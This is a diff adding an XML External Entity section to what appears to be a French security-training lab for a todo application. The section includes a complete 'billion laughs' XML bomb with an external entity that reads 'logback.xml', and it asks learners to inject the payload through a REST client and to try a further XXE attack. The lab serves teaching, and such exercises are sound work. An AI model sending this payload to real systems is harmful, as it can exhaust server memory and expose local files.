@@ -297,7 +297,37 @@ utilisez le code suivant dans la description de la todo (en remplaçant l'id 1lw
 - Générez un cookie de session sécurisé (html only et secure) avec un token non rejouable
 - Supprimez l'interprétation de la description d'une todo dans la page publique
 
-== XXE ?
+== XXE (Xml External Entity)
+
+Connaissez-vous les xml bomb ? Quelle est l'empreinte mémoire du fichier xml ci-dessous ?
+Risquez vous un DoS ?
+Essayez de l'injecter dans l'application (par votre client REST).
+
+----
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE todo [
+<!ENTITY xxe SYSTEM "logback.xml" >
+ <!ENTITY lol "lol">
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+
+]>
+<todo>
+  <userId>1</userId>
+  <summary>hacking with XML</summary>
+  <description>you've been hacked with XXE exploit</description>
+  <secret>&lol9;</secret>
+</todo>
+----
+
+Un autre type d'attaque XXE existe. Essayez de l'exploiter sur la ressource todos/xml.
 
 == Augmentez vos privilèges
 
